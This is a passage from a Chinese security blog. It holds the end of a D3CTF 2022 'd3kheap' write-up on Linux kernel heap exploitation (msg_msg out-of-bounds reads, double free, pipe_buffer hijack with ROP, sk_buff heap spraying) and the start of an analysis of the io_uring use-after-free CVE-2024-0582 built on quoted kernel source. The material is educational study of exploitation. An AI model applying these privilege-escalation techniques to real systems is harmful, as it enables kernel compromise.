&gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></li>
</ul>
<p>load_msg 函数调用 alloc_msg 函数分配对象，并调用 copy_from_user 拷贝用户输入内容。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="type">int</span> err = -EFAULT;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="type">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>alloc_msg 函数定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，其分配 msg_msg 生成的结构如下（kmalloc, GFP_KERNEL_ACCOUNT）：</p>
<ul>
<li>如果 size 小于 PAGE_SIZE-sizeof(msg_msg)，则会分配一个 size+header 大小的对象，前 0x30 大小存放 msg_msg 的 header，剩余部分存放用户数据。</li>
<li>如果超出，则超出部分会生成 msg_msgseg 结构体，该结构体为一个单向链表，前8字节存放下一个 msg_msgseg 结构体，剩余为用户数据。<br>因此，可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改 header 中的 m_ts （textsize）成员，从而实现堆上的数据越界，同时还能修改 msg_msg-&gt;next 实现任意地址读。<br>但是如果正常 msgrcv 接受消息，会调用 list_del() 将 msg_msg 结构体 unlink 掉，这会导致内核 panic。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">	       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
不过如果设置 MSG_COPY 标志就不会进行 unlink，从而绕过并且可以多次读取一个 msg_msg 结构体的数据。<br>接下来通过 setxattr 修改 msg_msg 的 next 指针为 NULL, 同时将其 m_ts 成员修改为 0x1000-0x30<br>然后即调用 copy_msg 函数搜索内存空间，copy_msg 函数在拷贝时会解引用 src-&gt;next 指针，如果 next 指针为 非法地址，则会导致 kernel panic。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line">	<span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">	     src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">	     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">		len -= alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">	dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
因此我们需要提供 src 正常的堆上地址来保证 合法 next 指针。<br>这里因为 slub 会向 buddy system 申请一张或者多张连续内存页，将其分割为指定大小的 object 之后在返还给 kmalloc 的 caller，对于大小为 0x1000 的 object，其每次申请到的连续内存页为四张，分为16个object （sudo cat &#x2F;proc&#x2F;slabinfo 命令可以查看信息）<br>那么如果我们可以分配多个 0x1000 大小的 msg_msg 结构体，那么就很有可能落在地址连续的 4 张内存页上，此时如果从一个 msg_msg 向后进行越界读，则很容易读取到其他的 msg_msg 结构体上的数据，其 m_list 成员可以帮助我们泄漏一个堆上地址。</li>
</ul>
<p>因此这里总结一下泄漏内核基址的流程（越界读+搜索）：</p>
<ul>
<li>分配多个 1024 大小的 msg_msg，可以修改其中一个为 0x1000-0x30 从而触发越界读；</li>
<li>修改其中一个 msg_msg 大小，即 m_ts 字段为 0x1000-0x30，同时 next 指针为 NULL，此时大概率可以越界读到后面的 msg_msg 结构体，从而读取到其 m_list 成员，m_list 成员会指向 msg_queue 的 qmessages 成员地址，该成员指针又会指向 msg_msg 的 m_list 地址。</li>
<li>修改 msg_msg 的 next 指针为 msg_queue-&gt;qmessages 地址，此时需要注意 msg_queue 不能 使用 msgrcv 接受消息，从而使 msg_queue-&gt;q_lrpid （qmessages 的前8字节，即可以指定为 next-&gt;next）为0，从而泄漏 msg_msg 的地址</li>
<li>然后根据 msg_msg 的地址一直向后搜索即可。（当然这里可以使用 page_offset_base + 0x9d000 的地址来进行泄漏）</li>
</ul>
<h4 id="Step3-构造-A-B-A-式-freelist-劫持新的结构体"><a href="#Step3-构造-A-B-A-式-freelist-劫持新的结构体" class="headerlink" title="Step3. 构造 A-&gt; B -&gt; A 式 freelist 劫持新的结构体"></a>Step3. 构造 A-&gt; B -&gt; A 式 freelist 劫持新的结构体</h4><p>两种提权方法：修改 cred 结构体；劫持内核执行流<br>这里 userfaultd 已被弃用，而且能搜索的 内存空间有限，因此选择劫持内核执行流的方法。<br>这里如果要将其分配到别的地方，而且要进行修改，需要先将其放回 slub 中，因为此时该结构体虽然是 free，但是分配到别的结构体时，我们就无法控制其内容，因为此时 msg_msg 结构体内容被覆盖，无法正常释放。<br>所以要修复 msg_msg 的双向链表，将 原 msg_msg 释放掉，这里只需要将双向链表指向堆上一个合法地址，next 指针为 NULL 即可。可以直接使用 setxattr 进行修复。（这里有一个点就是 slub 中空闲的 object 是在 kmem_cache-&gt;offset 处存放下一个 free object 的指针，而且对于较大的 object 而言，其 offset 通常大于 msg_msg header 的大小。<br>接下来构造 A -&gt; B -&gt; A 的 freelist 即可实现 Double free</p>
<h4 id="Step4-pipe-buffer-劫持-PIP"><a href="#Step4-pipe-buffer-劫持-PIP" class="headerlink" title="Step4. pipe_buffer 劫持 PIP"></a>Step4. pipe_buffer 劫持 PIP</h4><p>pipe_buffer 不修改 nr 的情况下，刚好从 kmalloc-1k 中取 object<br>当关闭 管道 两端时，会触发 pipe_buffer-&gt;pipe_buffer_operation-&gt;release 这一指针，因此我们需要劫持其函数表。</p>
<h3 id="解法2：msg-msg-sk-buff-堆喷"><a href="#解法2：msg-msg-sk-buff-堆喷" class="headerlink" title="解法2：msg_msg + sk_buff 堆喷"></a>解法2：msg_msg + sk_buff 堆喷</h3><p>构造布局如下 主消息（96 字节） -&gt; 辅助消息（0x400 字节）</p>
<img src="/posts/966ad166/file-20251016140819233.png" class="">
<p>double free，使用 sk_buff 堆喷重新获取到该结构体，利用 MSG_COPY 读取失败不会 panic 的特性完成定位</p>
<img src="/posts/966ad166/file-20251016141056882.png" class="">
<p>然后 越界读 辅助消息的下一个消息 header 获取到其 prev 主消息地址以及 next msg_queue 地址。<br>修改 next 为 prev 主消息的地址，读出 其辅助消息地址，从而再减 0x400 即 UAF 对象地址<br>利用 sk_buff 修改消息，释放 msg_msg 辅助消息完成 unlink，再申请 pipe_buffer 劫持 pipe_buffer.<br>利用 sk_buff 泄露 pipe_buffer 内内容，从而泄露内核代码段基址<br>利用 sk_buff 伪造 pipe_operations 内容，构造 ROP 劫持控制流</p>
<img src="/posts/966ad166/file-20251016141701770.png" class="">
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/D3CTF/2022/pwn/d3kheap">D3CTF2022 - d3kheap</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-0582学习</title>
    <url>/posts/65e9e2c8.html</url>
    <content><![CDATA[<p>CVE-2024-0582 是发生在 Linux Kernel 的 io_uring 这一个高性能异步 IO API 中的漏洞，得益于对使用 IORING_REGISTER_PBUF_RING 注册的 ring buffer 在 mmap() 映射的情况下存在可以在释放后仍被使用的 UAF 漏洞，攻击者可以通过该漏洞攻击内核并完成内核提权；该漏洞的 CVSS 分数为 7.8，影响版本包括但不限于 6.4～6.6.5，本文我们选用 6.4 的版本内核源码进行分析。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="PBUF-RING-Internal"><a href="#PBUF-RING-Internal" class="headerlink" title="PBUF_RING Internal"></a>PBUF_RING Internal</h3><p>我们这里主要关注 io_uring_register 函数中 switch 中与 PBUF_RING 相关的部分</p>
<h4 id="注册：IORING-REGISTER-PBUF-RING"><a href="#注册：IORING-REGISTER-PBUF-RING" class="headerlink" title="注册：IORING_REGISTER_PBUF_RING"></a>注册：IORING_REGISTER_PBUF_RING</h4><p>对于这个漏洞我们主要关注当 <code>opcode == IORING_REGISTER_PBUF_RING</code> 的情况，该 opcode 意味着注册一个环形缓冲区，其最终会调用到 io_register_pbuf_ring() 函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_register_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>, *<span class="title">free_bl</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="keyword">sizeof</span>(reg)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (reg.resv[<span class="number">0</span>] || reg.resv[<span class="number">1</span>] || reg.resv[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (reg.flags &amp; ~IOU_PBUF_RING_MMAP)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!reg.ring_addr)</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (reg.ring_addr &amp; ~PAGE_MASK)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (reg.ring_addr)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!is_power_of_2(reg.ring_entries))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* cannot disambiguate full vs empty due to head/tail size */</span></span><br><span class="line">	<span class="keyword">if</span> (reg.ring_entries &gt;= <span class="number">65536</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(reg.bgid &lt; BGID_ARRAY &amp;&amp; !ctx-&gt;io_bl)) &#123;</span><br><span class="line">		<span class="type">int</span> ret = io_init_bl_list(ctx);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bl = io_buffer_get_list(ctx, reg.bgid);</span><br><span class="line">	<span class="keyword">if</span> (bl) &#123;</span><br><span class="line">		<span class="comment">/* if mapped buffer ring OR classic exists, don&#x27;t allow */</span></span><br><span class="line">		<span class="keyword">if</span> (bl-&gt;is_mapped || !list_empty(&amp;bl-&gt;buf_list))</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		free_bl = bl = kzalloc(<span class="keyword">sizeof</span>(*bl), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!bl)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP))</span><br><span class="line">		ret = io_pin_pbuf_ring(&amp;reg, bl);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = io_alloc_pbuf_ring(&amp;reg, bl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">		bl-&gt;nr_entries = reg.ring_entries;</span><br><span class="line">		bl-&gt;mask = reg.ring_entries - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		io_buffer_add_list(ctx, bl, reg.bgid);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kfree(free_bl);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关注存在 IOU_PBUF_RING_MMAP 标志时会调用 io_alloc_pbuf_ring 函数，由内核分配连续页面，否则调用 io_pin_pbuf_ring 函数将用户态页面 pin 到 ring 上，（当 io_buffer_get_list 获取到的 bl 为空时会调用到这里进行分配）<br>IOU_PBUF_RING_MMAP 标志表示由内核分配环形缓冲区的内存，之后用户态应用使用 mmap() 映射来访问：<br>继续查看 io_alloc_pbuf_ring() 函数，可以看到调用 __get_free_pages 来分配页面，flag 为 GFP_KERNEL_ACCOUNT ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __get_free_pages(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">	page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);</span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span>) page_address(page);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_free_pages);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_alloc_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_uring_buf_reg *reg,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> io_buffer_list *bl)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;</span><br><span class="line">	<span class="type">size_t</span> ring_size;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	ring_size = reg-&gt;ring_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf_ring);</span><br><span class="line">	ptr = (<span class="type">void</span> *) __get_free_pages(gfp, get_order(ring_size));</span><br><span class="line">	<span class="keyword">if</span> (!ptr)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	bl-&gt;buf_ring = ptr;</span><br><span class="line">	bl-&gt;is_mapped = <span class="number">1</span>;</span><br><span class="line">	bl-&gt;is_mmap = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分配的结构体为 <code>io_uring_buf_ring</code> ，其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_ring</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * To avoid spilling into more pages than we need to, the</span></span><br><span class="line"><span class="comment">		 * ring tail is overlaid with the io_uring_buf-&gt;resv field.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	resv1;</span><br><span class="line">			__u32	resv2;</span><br><span class="line">			__u16	resv3;</span><br><span class="line">			__u16	tail;</span><br><span class="line">		&#125;;</span><br><span class="line">		__DECLARE_FLEX_ARRAY(<span class="keyword">struct</span> io_uring_buf, bufs);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/posts/65e9e2c8/file-20251014100704953.png" class="">
<h4 id="注销：IORING-UNREGISTER-PBUF-RING"><a href="#注销：IORING-UNREGISTER-PBUF-RING" class="headerlink" title="注销：IORING_UNREGISTER_PBUF_RING"></a>注销：IORING_UNREGISTER_PBUF_RING</h4><p>注销 PBUF_RING 对应的操作为 IORING_UNREGISTER_PBUF_RING ，内核会调用到 io_unregister_pbuf_ring 进行处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_unregister_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="keyword">sizeof</span>(reg)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (reg.resv[<span class="number">0</span>] || reg.resv[<span class="number">1</span>] || reg.resv[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (reg.flags)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	bl = io_buffer_get_list(ctx, reg.bgid);</span><br><span class="line">	<span class="keyword">if</span> (!bl)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (!bl-&gt;is_mapped)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	__io_remove_buffers(ctx, bl, <span class="number">-1U</span>);</span><br><span class="line">	<span class="keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;</span><br><span class="line">		xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);</span><br><span class="line">		kfree(bl);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过 __io_remove_buffers 函数来释放 bl ，然后使用 xa_erase 函数移除该 io_buffer_list 并释放。<br>__io_remove_buffers 函数定义如下，由于在 alloc 时制定了 is_mapped &#x3D; 1; is_mmap&#x3D;1，因此会走以下路径：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_remove_buffers(<span class="keyword">struct</span> io_ring_ctx *ctx,</span><br><span class="line">			       <span class="keyword">struct</span> io_buffer_list *bl, <span class="type">unsigned</span> nbufs)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* shouldn&#x27;t happen */</span></span><br><span class="line">	<span class="keyword">if</span> (!nbufs)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bl-&gt;is_mapped) &#123;</span><br><span class="line">		i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (bl-&gt;is_mmap) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">			page = virt_to_head_page(bl-&gt;buf_ring);</span><br><span class="line">			<span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">				free_compound_page(page);</span><br><span class="line">			bl-&gt;buf_ring = <span class="literal">NULL</span>;</span><br><span class="line">			bl-&gt;is_mmap = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> &#123;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* make sure it&#x27;s seen as empty */</span></span><br><span class="line">		INIT_LIST_HEAD(&amp;bl-&gt;buf_list);</span><br><span class="line">		bl-&gt;is_mapped = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用：io-uring-mmap"><a href="#使用：io-uring-mmap" class="headerlink" title="使用：io_uring_mmap"></a>使用：io_uring_mmap</h4><p>可以通过 mmap() 对 io_uring 的 fd 进行映射，内核最终会调用到 io_uring_mmap() 函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pfn;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line"></span><br><span class="line">	pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">	<span class="keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">io_uring_fops</span> =</span> &#123;</span><br><span class="line">	.release	= io_uring_release,</span><br><span class="line">	.mmap		= io_uring_mmap,</span><br></pre></td></tr></table></figure>
<p>继续查看 io_uring_validate_mmap_request 函数内容，可以发现在对 pbuf 的获取指针是 ctx 的 bl：</p>
